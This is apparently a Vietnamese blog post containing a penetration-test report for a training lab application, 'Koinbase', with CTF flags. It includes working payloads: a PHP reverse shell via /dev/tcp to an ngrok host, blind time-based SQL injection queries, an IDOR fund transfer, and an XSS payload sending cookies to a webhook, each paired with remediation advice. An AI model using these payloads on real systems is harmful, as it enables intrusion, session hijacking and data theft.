---
layout: post
title:  "Report Mock Test"
date:   2025-05-14 12:47:00 +0700
tags: Report CBJS
categories: jekyll update
---

# I. Tổng quan
## 1. Mục tiêu
Báo cáo nhằm liệt kê các lỗ hổng bảo mật và các vấn đề liên quan được phát hiện liên quan đến quá trình phát hiện của ứng dụng `Koinbase`

## 2. Đối tượng 
Các mục tiêu kiểm thử bao gồm:
- `https://koinbase.cyberjutsu-lab.tech/`
- `https://upload.koinbase.cyberjutsu-lab.tech/`

## 3. Phạm vi
Phạm vi kiểm thử bao gồm toàn bộ chức năng của ứng dụng Koinbase được triển khai trên hai đối tượng. 

Quá trình kiểm thử được thực hiện trong môi trường CyberJustu Academy cung cấp, không gây ảnh hưởng đến hệ thống thực tế. Phương pháp kiểm thử áp dụng là White-box. Các công cụ và kỹ thuật kiểm thử tuân thủ quy định của bài kiểm tra, đảm bảo tính hợp pháp và an toàn. Ứng dụng không được gắn với phiên bản cụ thể nào trong quá trình kiểm thử.

## 4. Quy ước đặt mã lỗ hổng 
Các lỗ hổng được phát hiện trong quá trình kiểm thử sẽ được đặt mã định danh theo quy ước sau:

- **KB-[Số thứ tự]**: Lỗ hổng trên `https://koinbase.cyberjutsu-lab.tech/`
- **UB-[Số thứ tự]**: Lỗ hổng trên `https://upload.koinbase.cyberjutsu-lab.tech/`

Số thứ tự được đánh tăng dần theo thứ tự liên quan đến các lỗ hổng, dựa trên luồng khai thác thực tế.

## 5. Bảng tổng hợp các lỗ hổng
![image](https://hackmd.io/_uploads/H1gzpRYbWee.png)
<p style="text-align:center"><em>Lỗ hổng tại <code>https://upload.koinbase.cyberjutsu-lab.tech/</code></em></p>

![image](https://hackmd.io/_uploads/ryTmx9Zbxg.png)
<p style="text-align:center"><em>Lỗ hổng tại <code>https://koinbase.cyberjutsu-lab.tech/</code></em></p>

# II. Chi tiết các lỗ hổng bảo mật 

## 1. UB-01: Full Source Code Exposure via Publicly Accessible `backup.zip` Archive [<span style="color:#F39C12">High</span>]

### Description and Impact 

Trong quá trình thu thập thông tin tại địa chỉ `https://upload.koinbase.cyberjutsu-lab.tech/`, phát hiện tệp sao lưu backup.zip được lưu trữ công khai trên máy chủ.

File này chứa toàn bộ mã nguồn ứng dụng web, bao gồm logic xử lý, cấu hình hệ thống và các endpoint ẩn. Việc lộ mã nguồn tạo điều kiện cho kẻ tấn công phân tích, khai thác lỗ hổng và có thể dẫn đến thực thi mã từ xa (RCE) hoặc các hình thức tấn công nghiêm trọng khác.

### Root Cause Analysis

File `backup.zip` chứa toàn bộ mã nguồn đã bị lưu trữ công khai trên máy chủ do thiếu kiểm soát truy cập và quy trình quản lý tệp sao lưu không phù hợp. Đây là một lỗi cấu hình (misconfiguration) trong khâu triển khai hoặc vận hành hệ thống, dẫn đến rò rỉ dữ liệu nhạy cảm.

### Step to reproduce 

Đầu tiên, ta sử dụng công cụ `dirsearch` với lệnh:
```bash=
python dirsearch.py -u https://upload.koinbase.cyberjutsu-lab.tech/
```

![image](https://hackmd.io/_uploads/Sk7s8X1Wll.png)
<p style="text-align:center"><em>Scan Directory</em></p>

![image](https://hackmd.io/_uploads/S1jDvXkbeg.png)
<p style="text-align:center"><em>/robots.txt</em></p>

Mặc dù đã cho `/backup.zip` vào trong `Disallow` nhưng nó chỉ có tác dụng với các công cụ tìm kiếm như **Googlebot**, còn với người dùng truy cập thì vẫn có thể tìm đến đường dẫn này bình thường. 

Từ đây mình đã lấy toàn bộ source code của `https://koinbase.cyberjutsu-lab.tech/` và `https://upload.koinbase.cyberjutsu-lab.tech/`

![image](https://hackmd.io/_uploads/ByoOd71Wlx.png)
<p style="text-align:center"><em>Source code</em></p>

Và ta có thể đọc toàn bộ source code để tìm thông tin quan trọng. 

![image](https://hackmd.io/_uploads/ryTm9Q1bxl.png)

`Flag 1: CBJS{do_you_use_a_good_wordlist?}`

### Recommendations
- Không nên lưu trữ file sao lưu, mã nguồn, hoặc bất kỳ dữ liệu nhạy cảm nào trên môi trường production.
- Áp dụng chính sách backup an toàn, trong đó sao lưu phải được lưu trữ ở khu vực riêng biệc, nên được mã hóa và giới hạn quyền truy cập.

### References 
- https://github.com/maurosoria/dirsearch

## 2. UB-02: Avatar Upload Feature on `koinbase.cyberjutsu-lab.tech` Enables RCE on Upload Subdomain [<span style="color:#E74C3C">Critical</span>]

### Description and Impact 

Tại website `https://koinbase.cyberjutsu-lab.tech/`, người dùng có thể tạo tài khoản và cập nhật ảnh đại diện (avatar) bằng cách nhập URL hình ảnh. Quá trình xử lý ảnh sẽ được chuyển tiếp đến một host phụ trợ là `https://upload.koinbase.cyberjutsu-lab.tech/`.

Tuy nhiên, host phụ này không kiểm soát chặt chẽ định dạng và nội dung của file tải về từ URL, cho phép kẻ tấn công gửi một URL chứa file độc hại (ví dụ: file `.php` có chứa mã lệnh). File sau đó được lưu lại và có thể truy cập trực tiếp thông qua đường dẫn công khai, dẫn đến `Remote Code Execution (RCE)` trên máy chủ upload.

### Root Cause Analysis 

Lỗ hổng này xuất phát từ việc host `https://upload.koinbase.cyberjutsu-lab.tech/` xử lý logic không chặt chẽ trong quá trình kiểm tra tệp tải về. Cụ thể là:

- Không kiểm tra hợp lệ phần đuôi mở rộng (extension) của tệp tin, cho phép kẻ tấn công tải lên các tệp nguy hiểm như `.php`, `.phtml`, v.v.
- Chỉ kiểm tra loại file dựa trên `mime_type` sau khi tải về, trong khi kẻ tấn công hoàn toàn có thể giả mạo `mime_type` hoặc nhúng mã độc vào trong file hình ảnh.
- Để cấu hình mặc định cho phép người dùng truy cập không giới hạn trên web server.

![image](https://hackmd.io/_uploads/BJ8JlBJbge.png)
<p style="text-align:center"><em>input xử lý trên host phụ trợ</em></p>

![image](https://hackmd.io/_uploads/HJYFnN1bxe.png)
<p style="text-align:center"><em>Code xử lý file trên URL</em></p>

Ở dòng 27-32 là kiểm tra URL người dùng cung cấp có là 1 URL hợp lệ.

Dòng 34-35 là dùng biến `filename` để xử lý đường dẫn lưu file (thay đổi tên file gốc).
```
upload/<random_16_ký_tự>.<extension_từ_URL>
```
Sau đó, hàm `file_get_contents()` này chỉ đọc nội dung file về dưới dạng chuỗi, nhưng không thực thi. 

Tiếp theo đó, dùng hàm `file_put_contents()` để có thể ghi nội dung vào đường dẫn dựa trên biến `filename`.

Sau đó mới kiểm tra xem file đó phải là hình ảnh hay không.
![image](https://hackmd.io/_uploads/SJ5vO4yZlg.png)
<p style="text-align:center"><em>Hàm kiểm tra và lấy extension của file từ URL</em></p>

Dựa trên hàm `isImage`, nhưng hàm này chỉ kiểm tra tính hợp lệ dựa trên `mime_type` khiến cho kẻ tấn công có thể giả mạo `mime_type` thông qua một `signature file`.

Và cấu hình mặc định khiến cho file `.php` có thể thực thi là: 

![image](https://hackmd.io/_uploads/HJKUbBJZll.png)
<p style="text-align:center"><em>Cấu hình mặc định cho phép thực thi file</em></p>

Nghĩa là tất cả các thư mục con trong `/var/www/`, bao gồm cả `/var/www/html/upload/`, sẽ:

- Được phép truy cập `(Require all granted)`
- Không bị cấm gì về PHP 
- Không có `AllowOverride`, nên file `.htaccess` cũng không hiệu lực để chặn PHP nếu không bật lại

### Step to reproduce 

Đầu tiên, mình sẽ tạo 1 file `shell.php` với nội dung như sau:
```bash=
GIF89a
<?php phpinfo(); ?>
```
Sau đó, mình dùng web https://tmpfiles.org/ để upload file `shell.php` từ đây có thể gửi URL này đến chức năng upload avatar.

![image](https://hackmd.io/_uploads/S1fVQH1Zlg.png)
<p style="text-align:center"><em>Upload thành công file `shell.php` lên tmpfiles</em></p>

Tiếp theo, ta gửi URL chứa file `shell.php` được cấp lên chức năng upload avatar.

![image](https://hackmd.io/_uploads/Bya2QryZxe.png)
<p style="text-align:center"><em>Cấp URL chứa file `shell.php` lên chức năng upload avatar</em></p>

Giờ ta cần tìm đường dẫn file đã được thay đổi. Quan sát trong BurpSuite, ta thấy:

![image](https://hackmd.io/_uploads/H1UkIByWgl.png)
<p style="text-align:center"><em>Tên file đã thay đổi từ `shell.php` thành `4762991e1201cbcb.php`</em></p>

Cuối cùng, ta truy cập vào `upload/4762991e1201cbcb.php` trên host `https://upload.koinbase.cyberjutsu-lab.tech/`

![image](https://hackmd.io/_uploads/rJgQIrJ-ll.png)
<p style="text-align:center"><em>Thực hiện code PHP trên host `upload` thành công</em></p>

Khi đã biết thư mục `upload` cho phép thực thi mã `PHP`, ta có thể tạo một tệp giả mạo hình ảnh (ví dụ `.gif`) nhưng thực chất chứa mã độc để thiết lập `reverse shell`.

```bash=php
GIF89a
<?php system('bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/YOUR_PORT 0>&1"'); ?>
```
Ta sử dụng `ngrok` để công khai một cổng TCP trên máy local ra Internet.

![image](https://hackmd.io/_uploads/S1JswBJbeg.png)
<p style="text-align:center"><em>Public một kết nối TCP ra ngoài internet bằng ngrok</em></p>

![image](https://hackmd.io/_uploads/BJlJdSy-ge.png)
<p style="text-align:center"><em>Mở kết nối TCP ở local để chờ reverse shell</em></p>

Khi máy chủ `upload.koinbase.cyberjutsu-lab.tech` thực thi file PHP chứa payload, lệnh `bash` sẽ kết nối đến host và port được cung cấp bởi `ngrok`, từ đó ánh xạ về `netcat` đang chờ sẵn.

![image](https://hackmd.io/_uploads/rkT0KrJWgx.png)
<p style="text-align:center"><em>Kết nối thông qua reverse shell thành công</em></p>

`Flag 2: CBJS{y0u_rce_me_or_you_went_in_another_way?}`

### Recommendations 
Để khắc phục và phòng ngừa lỗ hổng RCE thông qua chức năng upload hình ảnh, hệ thống nên thực hiện một số biện pháp bảo mật quan trọng.
- Cần giới hạn nghiêm ngặt loại tệp tin được phép tải lên bằng cách kiểm tra đồng thời phần mở rộng (extension) và nội dung thực của file (MIME type), đồng thời chỉ chấp nhận các định dạng ảnh phổ biến.
- Thư mục lưu trữ file `upload` phải được cấu hình để không thực thi mã PHP, ví dụ thông qua `.htaccess` hoặc cấu hình máy chủ web.

### References 
- https://portswigger.net/web-security/file-upload#what-are-file-upload-vulnerabilities

## 3. KB-01: Broken Access Control in Money Transfer API [<span style="color:#E74C3C">Critical</span>]

### Description and Impact 

Tại endpoint API `/api/transaction.php?action=transfer_money` tại `https://koinbase.cyberjutsu-lab.tech/` cho phép thực hiện chuyển tiền mà không kiểm tra quyền sở hữu đối với `sender_id`, `receiver_id` và `amount`. Kẻ tấn công có thể gửi yêu cầu **POST** chỉ định các tham số tùy ý, từ đó thực hiện giao dịch thay mặt người dùng khác mà không cần xác thực.

Lỗ hổng này là một trường hợp **Insecure Direct Object Reference (IDOR)**, cho phép chiếm đoạt tiền từ bất kỳ tài khoản nào trong hệ thống, gây ảnh hưởng nghiêm trọng đến tài sản người dùng và uy tín của dịch vụ.

### Root Cause Analysis 
Lỗ hổng này xảy ra khi đã xác định người chuyển tiền hiện tại thông qua tham số **POST**`sender_id` và sau đó được truyền vào trong db để xác định thông tin qua dòng 4:

![image](https://hackmd.io/_uploads/r1h6lFZZxl.png)

Hàm `getinfoFromUserid` lấy thông tin thông qua `id` một cách đơn giản. 

![image](https://hackmd.io/_uploads/S1m2xIkbgg.png)

Từ đó kẻ tấn công có thể thay đổi `id` thành của người khác để chuyển tiền vào chính tài khoản của kẻ tấn công.

Vì các biến như `sender_id`, `receiver_id` và `amount` ta đều có thể kiểm soát, vì đều truyền qua **POST**.

![image](https://hackmd.io/_uploads/HybUWY-Zgl.png)
<p style="text-align:center"><em>Code xử lý chuyển tiền</em></p>

### Step to reproduce 

Đầu tiên, ta sẽ quan sát gói tin chuyển tiền trong BurpSuite thì ứng dụng gọi đến một api là `/api/transaction.php`

![image](https://hackmd.io/_uploads/BkWfELkbel.png)
Thì có các tham số **POST**:
- `sender_id` là `id` của tài khoản hiện tại. 
- `receiver_id` là `id` của tài khoản khác.
- `amount` là khoảng tiền sẽ chuyển.

![image](https://hackmd.io/_uploads/Sy0NLIkbgl.png)

Quan sát thì ta thấy tài khoản với `id` là 1 thì có nhiều tiền nhất và tài khoản với `id` là 3 là tài khoản hiện tại của mình.

Mình cần thay đổi `sender_id` thành admin sẽ gửi qua tài khoản của mình là `receiver_id` thành test với `amount` mình mong muốn.

![image](https://hackmd.io/_uploads/SyFBw8ybxl.png)

Kiểm tra lại tài khoản.

![image](https://hackmd.io/_uploads/r1PDwIJWge.png)

Thì ta đã thực hiện chuyển tiền thành công từ admin sang tài khoản của mình.

`Flag 4: CBJS{master_of_broken_access_control}`

### Recommendations 
- Không sử dụng `sender_id` từ phía `client`. Thay vào đó, xác định người gửi dựa trên phiên đăng nhập hiện tại `$user = getinfoFromUserid($_SESSION['user_id']);`
- Xác thực người dùng trước khi xử lý giao dịch, đảm bảo người dùng chỉ có thể thực hiện hành động với chính tài khoản của mình.
- Triển khai kiểm soát truy cập đúng đắn (Access Control) phía server để tránh các lỗ hổng IDOR tương tự.
- Log lại mọi giao dịch bất thường, ví dụ như khi sender_id và receiver_id không khớp với session để hỗ trợ phát hiện tấn công.

## 4. KB-02: SQLi Time Base at `id` parameter in `public_info` API [<span style="color:#F39C12">High</span>]

### Description and Impact 
Lỗi này bắt nguồn **KB-01**, từ câu `query` trong hàm `getInfoFromUserId()` từ đây kẻ tấn công có thể nối dài thêm câu lệnh `query` để có thể thực hiện việc lấy dữ liệu nhạy cảm của người dùng. 
Việc này có thể làm lộ ra nhiều dữ liệu của người dùng được lưu trong database.

### Root Cause Analysis 
Lỗ hổng này xảy ra trong endpoint `/api/user.php?action=public_info?id=`, đây là chức năng xem thông tin public từ bất kì `id` nào. 

Và trong endpoint này được truyền qua tham số `id` cũng thông qua hàm `getInfoFromUserId()` (đã có giải thích ở **KB-01**), từ đây mình có thể truyền các payload SQLi để có thể lấy data. 

### Step to reproduce 

Đầu tiên, ta sẽ truyền thử payload: 
```bash=
id=0 OR 1=1-- a
```
![image](https://hackmd.io/_uploads/rkSM1tyblg.png)

Kết quả vẫn trả ra thông tin của admin nghĩa nó đã thực hiện vế `OR 1=1` là luôn đúng.

Sau khi thử nhiều payload thì nhận định đây SQLi Time Base Delay.

Payload tiếp theo ta truyền là: 
```bash=mysql
id=0 OR SLEEP(10)-- a
```
![image](https://hackmd.io/_uploads/Skr-eFyWxl.png)

Từ đây mình có thể viết script để có thể xác định tên database hiện đang dùng. 

Payload đầu tiên sẽ là: 

```bash=
OR IF((SELECT ASCII(SUBSTRING(database(),{i},1))>{mid}),SLEEP(1),0)
```
Kỹ thuật ta sử dụng kỹ thuật **Blind SQL Injection (Time-based)** kết hợp với **Binary Search** để khai thác lỗ hổng. 

Do ứng dụng không phản hồi dữ liệu ra ngoài, ta sử dụng câu truy vấn `IF(..., SLEEP(x), 0)` để xác định đúng/sai thông qua độ trễ thời gian phản hồi. 

Binary Search giúp giảm số lần thử nghiệm từ khoảng 95 ký tự còn khoảng 7 lần cho mỗi ký tự cần dò, giúp tiết kiệm thời gian và tăng độ hiệu quả trong quá trình khai thác.

![image](https://hackmd.io/_uploads/ByWo8K-blg.png)
<p style="text-align:center"><em>Python code Exploit Blind SQL Injection</em></p>

Kết quả được, tên database hiện tại là `tonghop`
![image](https://hackmd.io/_uploads/SJRNUtZble.png)

Tiếp theo ta lấy tên các bảng trong database này, đoạn code vẫn giống, ta chỉ thay đổi payload cho phù hợp:
```bash=
OR IF((SELECT LENGTH(GROUP_CONCAT(table_name))FROM information_schema.tables WHERE table_schema=database())={i},SLEEP(1),0)
```

Kết quả:
![image](https://hackmd.io/_uploads/HyP7FK--xx.png)

Ta đã thấy bảng `flag`, giờ ta sẽ lấy các cột trong bảng này.

Và do ta bị giới hạn dấu `'` thì nên mình không thể chỉ định tên bảng như bình thường. Nên mình truyền payload như sau:
```bash=
OR IF((SELECT LENGTH(GROUP_CONCAT(column_name))FROM information_schema.columns WHERE table_name={table_hex})={i},SLEEP(1),0)
```
Thì bảng `flag` thì mình sẽ hex thành `0x666c6167` sau đó truyền vào câu query trên.

Kết quả:

![image](https://hackmd.io/_uploads/H1mN9t-Wxg.png)

Cuối cùng, ta lấy giá trị trong cột `flag` của bảng `flag`:

![image](https://hackmd.io/_uploads/SJ6FqFWZgg.png)

`Flag: Flag 5: CBJS{integer_id_with_sqlinjection}`

### Attachments:
- `script.py`

### Recommendations 
- Sử dụng Prepared Statements.
- Xác thực và lọc dữ liệu đầu vào (Input Validation)
- Ghi log và giám sát

## 4. KB-03: XSS Reflected at `page` Parameter Leading to Session Hijacking via Cookie Theft [<span style="color:#F39C12">High</span>]

### Description and Impact 
Ở chức năng hiện số trang hiện tại của ứng dụng, ứng dụng đã trả về 1 file `index.js` trong đó có chứa các code JavaScript thực hiện render ra UI cho người dùng. Và ứng dụng lại dùng `sink` nguy hiểm như `innerHTML` để thể thực hiện thao tác JavaScript với các tag HTML.

![image](https://hackmd.io/_uploads/HkD2GK1-gx.png)

Kẻ tấn công có thể tiêm mã JavaScript độc hại vào trang web của ứng dụng và đánh cắp thông tin từ người dùng (như cookies, session IDs), hoặc thực hiện các hành động khác thay mặt người dùng mà không có sự cho phép của họ.

### Root Cause Analysis 

Lỗ hổng này xảy ra, khi sử dụng `innerHTML` mà không có các biện pháp xác thực hoặc xử lý đặc biệt có thể dẫn đến lỗ hổng `Cross-Site Scripting (XSS)`, đặc biệt là `Reflected XSS`. 

Mà mấu chốt là xảy ra trên dòng 16 ở đoạn code `index.js`

![image](https://hackmd.io/_uploads/rJItmYyblx.png)

Nếu mình truyền vào một tag HTML là `<h1>Test</h1>` thì nó vẫn có thể `render`.

![image](https://hackmd.io/_uploads/HJh37YkZll.png)

### Step to reproduce 

Bước đầu, ta đã thử với truyền vào 1 thẻ HTML và nó có thẻ render ra. Từ đây mình nhận định là `Reflected XSS`

Từ đó, mình tạo ra một thẻ hình ảnh `<img>` với `src` là gửi `request` đính kèm với `cookie` ra ngoài internet, cụ thể là webhook.

![image](https://hackmd.io/_uploads/ry2L4tkZxg.png)

Ban đầu, webhook không có request nào gửi ra.

Và sau đó, mình tạo ra 1 thẻ `<img>` như sau:

```bash=
<img src=x onerror="new Image().src=`<url_webhook>?c=`%2Bdocument.cookie">
```

Vì do ta bị chặn dấu `'` nên mình sẽ thay đổi thành **`**

![image](https://hackmd.io/_uploads/HJeDHKy-ex.png)

Nó đã có thể gửi `request` ra webhook. Đồng nghĩa là, sau đó mình gửi cho nạn nhân thì có thể lắp cắp được `cookie`.

![image](https://hackmd.io/_uploads/rylWoSK1bge.png)

`Cookie` của nạn nhân đã gửi về thành công.

![image](https://hackmd.io/_uploads/BJQTSt1Wxg.png)

Mình lấy cookie này để có thể đăng nhập vào phiên đó.

![image](https://hackmd.io/_uploads/BJ3z8Y1Zgx.png)

Mình đã xem được thông tin của user `id=2`

`Flag 3: CBJS{you_have_found_reflected_xss}`

### Recommendations 

- Có thể thay `innerHTML` thành `textContent`
- Kiểm tra giá trị đầu vào 
- Có thể tham khảo `sanitize` với thư viện `DOMPurify`

### References
- https://portswigger.net/web-security/cross-site-scripting/reflected
- https://portswigger.net/web-security/cross-site-scripting/preventing

# III. Kết luận
Quá trình phân tích bảo mật đã phát hiện ra lỗ hổng nghiêm trọng trong ứng dụng. Lỗ hổng này xuất phát từ việc thiếu kiểm soát đầu vào, xử lý dữ liệu không an toàn,
và không áp dụng các biện pháp xác thực. Tác động tiềm tàng bao gồm lộ dữ liệu người dùng, leo thang đặc quyền, và kiểm soát máy chủ, đe dọa nghiêm trọng đến tính bảo mật và toàn vẹn của hệ thống.
<p style="text-align: right;">Trân trọng, h4gphwc</p>